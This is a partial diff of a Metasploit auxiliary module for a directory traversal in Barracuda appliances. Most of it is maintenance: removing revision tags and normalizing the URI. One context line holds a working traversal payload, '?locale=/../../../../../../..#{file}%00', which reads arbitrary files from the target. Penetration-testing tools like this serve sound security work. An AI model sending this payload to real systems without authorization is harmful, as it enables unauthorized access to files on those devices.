@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -20,7 +16,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'           => 'Barracuda Multiple Product "locale" Directory Traversal',
-			'Version'        => '$Revision$',
 			'Description'    => %q{
 					This module exploits a directory traversal vulnerability present in
 				serveral Barracuda products, including the Barracuda Spam and Virus Firewall,
@@ -31,7 +26,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					['OSVDB', '68301'],
 					['URL', 'http://secunia.com/advisories/41609/'],
-					['EDB', 15130]
+					['EDB', '15130']
 				],
 			'Author'         =>
 				[
@@ -51,11 +46,12 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def target_url
-		"http://#{vhost}:#{rport}#{datastore['URI']}"
+		uri = normalize_uri(datastore['URI'])
+		"http://#{vhost}:#{rport}#{uri}"
 	end
 
 	def run_host(ip)
-		uri = datastore['URI']
+		uri = normalize_uri(datastore['URI'])
 		file = datastore['FILE']
 		payload = "?locale=/../../../../../../..#{file}%00"
 
